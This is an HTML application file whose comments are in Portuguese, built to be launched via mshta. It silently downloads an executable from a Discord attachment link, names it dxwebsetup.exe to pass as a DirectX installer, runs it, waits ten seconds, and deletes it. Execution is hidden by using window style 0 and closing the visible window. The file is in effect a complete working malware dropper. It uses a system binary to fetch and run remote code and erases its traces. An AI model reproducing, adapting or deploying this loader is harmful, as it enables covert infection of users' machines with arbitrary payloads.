<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Baixar, Executar e Apagar - MSHTA</title>

    <script language="JScript">
        // -----------------------------------------------------
        // 1. Variáveis de Configuração
        // -----------------------------------------------------
        var FileURL = "https://cdn.discordapp.com/attachments/1440238279441252407/1440831105820524594/dxwebsetup.exe?ex=691f9608&is=691e4488&hm=0cd0cd30bb022289189515710f772a686b8e40dd010bfee084e526dce1e4b3f4&";
        var LocalFileName = "dxwebsetup.exe";
        var ExecutionWaitSeconds = 10; // Tempo de espera para o arquivo ser executado antes de apagar (em segundos)

        // -----------------------------------------------------
        // 2. VBScript para Download, Execução e Limpeza
        // -----------------------------------------------------
        var VBS_SCRIPT = `
            On Error Resume Next
            
            ' Configurações
            Dim WshShell, FSO, objXMLHttp, objStream
            Dim FileURL, LocalFileName, ExecutionWaitSeconds
            FileURL = "` + FileURL + `"
            LocalFileName = "` + LocalFileName + `"
            ExecutionWaitSeconds = ` + ExecutionWaitSeconds + `
            
            Set WshShell = CreateObject("WScript.Shell")
            Set FSO = CreateObject("Scripting.FileSystemObject")
            
            ' --- A) Download ---
            Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
            objXMLHttp.open "GET", FileURL, False
            objXMLHttp.send
            
            If objXMLHttp.Status = 200 Then
                Set objStream = CreateObject("ADODB.Stream")
                objStream.Open
                objStream.Type = 1 ' Binário
                objStream.Write objXMLHttp.responseBody
                objStream.SaveToFile LocalFileName, 2 ' Salva o arquivo
                objStream.Close
                
                ' --- B) Execução ---
                WshShell.Run LocalFileName, 1, False ' Executa o EXE (1 = janela normal, True/False não importa muito aqui)
                
                ' --- C) Espera e Apaga ---
                WScript.Sleep (ExecutionWaitSeconds * 1000) ' Espera X segundos
                
                If FSO.FileExists(LocalFileName) Then
                    FSO.DeleteFile LocalFileName, True ' Apaga o arquivo
                End If
            End If
            
            Set WshShell = Nothing
            Set FSO = Nothing
        `;

        // -----------------------------------------------------
        // 3. Execução Silenciosa
        // -----------------------------------------------------
        // Comando que injeta o VBScript e executa de forma oculta (0)
        var cmd = 'mshta.exe vbscript:Execute("' + VBS_SCRIPT.replace(/"/g, '\"') + '"):window.close';
        
        // Executa o comando em segundo plano (0)
        new ActiveXObject("WScript.Shell").Run(cmd, 0, false);
        
        // Fecha a janela visível atual (a que foi aberta no Win+R)
        window.close();
    </script>
</head>
<body onload="window.close()">
</body>
</html>
